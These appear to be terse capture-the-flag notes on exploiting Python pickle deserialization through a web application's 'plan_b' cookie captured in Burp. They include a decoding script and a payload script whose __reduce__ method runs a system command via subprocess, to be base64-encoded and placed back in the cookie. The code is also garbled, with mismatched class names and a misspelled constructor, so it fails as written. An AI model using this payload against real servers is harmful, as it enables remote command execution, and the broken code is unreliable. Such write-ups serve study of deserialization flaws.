<__main__.anti_pickle_serum object at 0x7f17ddb057d0>

pickle (Python object serialization)

what object to pickle or unpickle?

using burp you get:
cookie:	- laravel_session
	    - io
	    - plan_b

echo '{plan_b cookie}' | base64 -d

do unpickling

create unpickled.py file
```
import pickle
from base64 import b64decode

class anti_pickle_serum(object):
	def _initi_(self):
		pass

cookie=b'<cookie from burp>'

unpickled=pickle.loads(b64decode(cookie))
print(unpickled)
```

pickle.py
```
from base64 import b64encode
import subprocess
import pickle
import os

class anti_pickel_serum(object):
	def __reduce__ (self):
		return subprocess.check_output, (['ls'],)

pickled = pickle.dumps({'serum': anti_pickle_serum()}, protocol=0)
encodedpickled = b64encode(pickled)

print(encodedpickled)
```

the final value of encodedpickled should be the one that used in the cookie in burp